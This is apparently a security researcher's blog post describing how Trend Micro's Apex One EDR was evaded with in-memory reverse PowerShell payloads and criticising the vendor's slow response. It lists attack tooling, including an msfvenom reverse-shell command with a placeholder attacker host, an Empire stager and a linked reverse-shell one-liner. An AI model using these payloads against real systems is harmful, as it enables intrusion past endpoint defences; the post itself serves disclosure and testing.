![Linkedin](Post%20Images/linkedin.png) [Linkedin](https://www.linkedin.com/in/ryangore/) | ![Github](Post%20Images/github.png) [Github](https://github.com/0v3rride)

# The Troubled Tale of Trend Micro
___________________________________

Imagnie, if you will, that your orginization utilizes a well known and 'trusted' Enterprise grade endpoint detection and response solution. Furthermore, imagine that you discover a way to bypass this solution, but to your horror a couple of seriously glarring issues come to the forefront: 
1. The EDR solution can be byapssed using simple or even very basic payloads. 
2. The EDR solution can be bypassed using exploit tools or frameworks that have aged well beyond the point where many would logically think that most vendors would have a solution to detect their signatures, etc.
3. A solution, update, signature, whatever still hasn't been deployed to clients despite working months on end with back-end engineers and other team members part of the vendor and providing beyond adequate information to help them.

Now, I'm a bit skeptical when it comes to AV and EDR solutions. One often hears sale reps tout about how great their product is. How it will *'block everything'*, *'prevent breaches'*, and blah, blah, blah. Obviously, a product like this isn't going to prevent bleeding edge methods or techniques that are used to get around them. The same goes for customized payloads. Heck, the simple reverse PowerShell script I wrote back in March surprisingly still gets around Defender and AMSI in Windows 10 build 1903. What I'm trying to get at, is that the art of bypassing anti-virus and EDR solutions is a whole other topic on its own that consists of individuals who know a much more than I do when it comes to this type of stuff. 

I wanted to put Trend Micro's Apex One solution to the test. For the sake of testing, the scenario was set in a situation in which an attacker had some sort of low privilege access to the machine. This could be a reverse shell, recovered creds that allowed for smblogin, login through RDP, etc. Needless to say, I was bit shocked when I discovered how trivial it was to get around it. Before I started testing, I had done enough research to know the basics or at least have a decent grasp on the thought process that went into the techniques of bypassing AV and EDR soluitions. As expected, it was blocking anything malicious that touched the disk. However, things started going downhill when I started testing payloads that resided in memory only. Keep in mind I wasn't trying to get sophisticated or do anything advanced. All I was doing was doing at this point was using well known and publicly available tools and frameworks and throwing them at my test machine to see if the agent would pick it up. 

### Tools and payloads that were used to bypass Apex One:
* MSFvenom: cmd/windows/reverse_powershell lhost=<attackip> lport=<attakport>
* Empire PowerShell with http listener and launcher to generate the stager
* My custom reverse PowerShell script
* A random reverse PowerShell one-liner [oneliner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
* SilentTrinity

I noticed an anomoly during testing when using the MSFvenom payload cmd/windows/reverse_powershell in conjuntion with the Magic Unicorn payload generator from TrustedSec. Apex One was catching this for some reason despite being obfuscated via base64 encoding. My basic knowledge of how AV and EDR technologies work leads me to believe the engine is building a risk rating based on several factors or attributes associated with the PowerShell code. Since the PowerShell code is obfuscated via base64 encoding, it uses this information as one factor along with several other factors to determine whether or not is is harmful. In this case it correctly identified that the payload generated from the Magic Unicorn payload generator is indeed malicious. Most of the other MSFVenom payloads that I've tested up to this point (windows/shell/reverse_tcp) and outputted in the formats `psh-cmd`, `hta-psh` is stopped by Apex One.
